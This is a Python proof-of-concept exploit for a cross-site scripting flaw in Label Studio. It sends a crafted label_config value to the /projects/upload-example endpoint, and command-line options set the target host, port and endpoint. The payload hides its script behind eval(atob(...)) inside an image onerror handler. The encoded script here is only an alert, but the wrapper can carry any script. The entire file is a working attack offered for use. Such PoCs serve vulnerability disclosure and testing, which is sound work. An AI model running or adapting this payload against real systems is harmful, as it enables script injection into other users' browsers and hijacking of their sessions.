import requests
import urllib.parse
import argparse
from termcolor import colored

def exploit_xss(target_url):
    print(colored(f"[*] Attempting to send XSS payload to {target_url}...", "cyan"))

    # XSS Payload
    payload = """<View><!-- {"data": {"text": "<div><img src=x onerror=eval(atob(`YWxlcnQoIlRpYW5XZW5nIEN5YmVyU2VjdXJpdHkiKQ==`))></div>"}} --><HyperText name="text" value="$text"/></View>"""

    # Encode payload
    encoded_payload = urllib.parse.quote(payload)

    try:
        # Send the request with the payload
        response = requests.get(f"{target_url}?label_config={encoded_payload}")

        if response.status_code == 200:
            print(colored("[+] Payload successfully sent!", "green"))
            print(colored(f"[+] Check this URL in a browser: {response.url}", "yellow"))
        else:
            print(colored(f"[-] Failed to send payload. HTTP Status Code: {response.status_code}", "red"))
    
    except Exception as e:
        print(colored(f"[-] An error occurred: {e}", "red"))

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="XSS Exploit PoC for Label Studio")
    
    parser.add_argument("-u", "--url", type=str, default="127.0.0.1", help="Target URL (default: 127.0.0.1)")
    parser.add_argument("-p", "--port", type=int, default=8080, help="Target Port (default: 8080)")
    parser.add_argument("-e", "--endpoint", type=str, default="/projects/upload-example", help="Target Endpoint (default: /projects/upload-example)")

    args = parser.parse_args()

    # Construct full target URL
    target = f"http://{args.url}:{args.port}{args.endpoint}"
    
    exploit_xss(target)
